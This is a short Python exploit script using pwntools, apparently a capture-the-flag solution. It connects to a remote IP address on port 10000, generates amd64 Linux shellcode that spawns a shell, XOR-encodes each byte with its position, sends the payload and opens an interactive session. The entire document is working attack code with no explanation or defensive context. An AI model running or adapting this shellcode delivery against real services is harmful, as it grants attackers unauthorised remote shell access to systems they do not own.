from pwn import *

p = remote("118.24.3.214" , 10000)

shellcode = asm(shellcraft.amd64.linux.sh() , arch = "amd64")
final = ""
for i in range(len(shellcode)):
	final += chr(ord(shellcode[i]) ^ (i + 1))
p.send(final)
p.interactive()